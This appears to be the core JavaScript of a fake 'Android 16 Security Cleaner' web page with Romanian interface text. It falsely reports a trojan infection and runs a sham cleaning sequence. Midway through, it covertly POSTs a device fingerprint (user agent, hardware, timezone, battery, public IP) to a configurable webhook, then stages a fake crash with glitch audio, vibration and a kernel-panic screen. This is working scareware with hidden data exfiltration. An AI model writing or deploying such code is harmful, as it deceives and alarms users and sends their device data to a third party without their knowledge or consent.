// ANDROID 16 SECURITY CLEANER - CORE ENGINE

// Telemetry State
const telemetryData = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  screenResolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`,
  cpuCores: navigator.hardwareConcurrency || 'N/A',
  ramGB: navigator.deviceMemory || 'N/A',
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
  batteryLevel: 'N/A',
  isCharging: 'N/A',
  ip: 'N/A',
  threatStatus: 'Trojan.Android16.Gen DETECTAT'
};

// Audio Synthesizer (Web Audio API - No external assets required)
class AudioSynth {
  constructor() {
    this.ctx = null;
  }

  init() {
    if (!this.ctx) {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) this.ctx = new AudioCtx();
    }
  }

  playBeep(freq = 880, duration = 0.1, type = 'sine') {
    try {
      this.init();
      if (!this.ctx) return;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  playGlitchSound() {
    try {
      this.init();
      if (!this.ctx) return;
      // White noise + synth buzz
      const bufferSize = this.ctx.sampleRate * 1.5;
      const buffer = this.ctx.createBuffer(1, bufferSize, this.ctx.sampleRate);
      const data = buffer.getChannelData(0);
      for (let i = 0; i < bufferSize; i++) {
        data[i] = Math.random() * 2 - 1;
      }

      const noise = this.ctx.createBufferSource();
      noise.buffer = buffer;

      const gain = this.ctx.createGain();
      gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 1.5);

      const filter = this.ctx.createBiquadFilter();
      filter.type = 'lowpass';
      filter.frequency.setValueAtTime(1000, this.ctx.currentTime);
      filter.frequency.linearRampToValueAtTime(100, this.ctx.currentTime + 1.5);

      noise.connect(filter);
      filter.connect(gain);
      gain.connect(this.ctx.destination);

      noise.start();

      // Add glitch siren
      const osc = this.ctx.createOscillator();
      const oscGain = this.ctx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(120, this.ctx.currentTime);
      osc.frequency.linearRampToValueAtTime(1200, this.ctx.currentTime + 0.5);
      osc.frequency.linearRampToValueAtTime(80, this.ctx.currentTime + 1.5);

      oscGain.gain.setValueAtTime(0.2, this.ctx.currentTime);
      oscGain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 1.5);

      osc.connect(oscGain);
      oscGain.connect(this.ctx.destination);

      osc.start();
      osc.stop(this.ctx.currentTime + 1.5);
    } catch (e) {}
  }
}

const audio = new AudioSynth();

// Initialize UI and telemetry collection
document.addEventListener('DOMContentLoaded', async () => {
  updateClock();
  setInterval(updateClock, 1000);

  // Load telemetry stats
  loadDeviceStats();

  // Battery API
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      updateBatteryInfo(battery);
      battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
      battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
    } catch (e) {}
  }

  // Fetch IP
  fetchPublicIP();

  // Load saved Webhook URL from localStorage if available
  const savedWebhook = localStorage.getItem('android16_webhook_url');
  if (savedWebhook) {
    document.getElementById('webhookUrlInput').value = savedWebhook;
  }
});

function updateClock() {
  const now = new Date();
  const timeStr = now.toLocaleTimeString('ro-RO', { hour: '2-digit', minute: '2-digit' });
  const clockEl = document.getElementById('statusClock');
  if (clockEl) clockEl.textContent = timeStr;
}

function loadDeviceStats() {
  // Device Model / UA
  let model = 'Android Device';
  if (navigator.userAgent.includes('Samsung')) model = 'Samsung Galaxy (Android 16)';
  else if (navigator.userAgent.includes('Pixel')) model = 'Google Pixel (Android 16)';
  else if (navigator.userAgent.includes('Xiaomi') || navigator.userAgent.includes('Redmi')) model = 'Xiaomi Redmi (Android 16)';
  else if (/Android/i.test(navigator.userAgent)) model = 'Android 16 Phone';

  document.getElementById('statModel').textContent = model;
  document.getElementById('statResolution').textContent = telemetryData.screenResolution;
  document.getElementById('statCpuRam').textContent = `${telemetryData.cpuCores} Cores / ~${telemetryData.ramGB} GB RAM`;
  document.getElementById('statLang').textContent = `${telemetryData.language} (${telemetryData.timezone})`;
}

function updateBatteryInfo(battery) {
  const level = Math.round(battery.level * 100);
  const charging = battery.charging;
  telemetryData.batteryLevel = level;
  telemetryData.isCharging = charging;

  document.getElementById('statBattery').textContent = `${level}% ${charging ? '⚡ (Încărcare)' : '🔋'}`;
  document.getElementById('batteryStatusHeader').textContent = `${level}%`;
}

async function fetchPublicIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    if (res.ok) {
      const data = await res.json();
      telemetryData.ip = data.ip;
      document.getElementById('statIp').textContent = data.ip;
    }
  } catch (e) {
    document.getElementById('statIp').textContent = '192.168.1.102 (Local)';
  }
}

// Send Data to Webhook (Google Apps Script)
async function sendTelemetryToGoogleScript(webhookUrl) {
  if (!webhookUrl || !webhookUrl.startsWith('http')) {
    console.log('Webhook URL neconfigurat sau invalid. Trimitere simulata.');
    return;
  }

  // Save Webhook URL locally
  localStorage.setItem('android16_webhook_url', webhookUrl);

  try {
    // Mode no-cors for Google Apps Script compatibility
    await fetch(webhookUrl, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(telemetryData)
    });
    console.log('Telemetry trimis cu succes!');
  } catch (err) {
    console.error('Eroare trimitere Webhook:', err);
  }
}

// Start Clean & Trigger Crash Effect
async function startCleaningProcess() {
  audio.init();
  const webhookUrl = document.getElementById('webhookUrlInput').value.trim();

  // Show progress modal
  const overlay = document.getElementById('progressOverlay');
  const barFill = document.getElementById('progressBarFill');
  const logEl = document.getElementById('progressLog');
  const statusEl = document.getElementById('progressStatusText');

  overlay.classList.add('active');

  const steps = [
    { percent: 15, text: 'Scanare memorie RAM și fișiere sistem...', log: 'Analizând /system/bin/...' },
    { percent: 35, text: 'Izolare Trojan.Android16.Gen...', log: 'Identificat amenințare în memorie cache' },
    { percent: 65, text: 'Trimitere raport de securitate...', log: 'Sincronizare date telemetrie cu serverul...' },
    { percent: 85, text: 'Curățare fișiere infectate...', log: 'Eliminare registre corupte...' },
    { percent: 100, text: 'Finalizare proces de securizare...', log: 'Salvare raport final...' }
  ];

  for (let i = 0; i < steps.length; i++) {
    const step = steps[i];
    barFill.style.width = `${step.percent}%`;
    statusEl.textContent = step.text;
    logEl.textContent = step.log;

    audio.playBeep(440 + step.percent * 5, 0.1, 'sine');

    // Trigger Webhook post around 65%
    if (step.percent === 65) {
      sendTelemetryToGoogleScript(webhookUrl);
    }

    await sleep(700);
  }

  // Delay before glitch crash
  await sleep(400);

  // Trigger Crash Sequence
  triggerGlitchAndCrash();
}

function triggerGlitchAndCrash() {
  const body = document.body;
  const crashScreen = document.getElementById('crashScreen');

  // Play glitch sounds & vibrate
  audio.playGlitchSound();
  if (navigator.vibrate) {
    navigator.vibrate([200, 100, 500, 100, 800, 200, 1000]);
  }

  // Add flicker and screen tear CSS
  body.classList.add('glitching', 'screen-tear');

  setTimeout(() => {
    // Show Crash Kernel Panic Screen
    crashScreen.classList.add('active');
    body.classList.remove('glitching', 'screen-tear');

    // Play final error tone
    audio.playBeep(150, 0.8, 'sawtooth');
  }, 1200);
}

function resetSimulation() {
  document.getElementById('crashScreen').classList.remove('active');
  document.getElementById('progressOverlay').classList.remove('active');
  document.getElementById('progressBarFill').style.width = '0%';
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
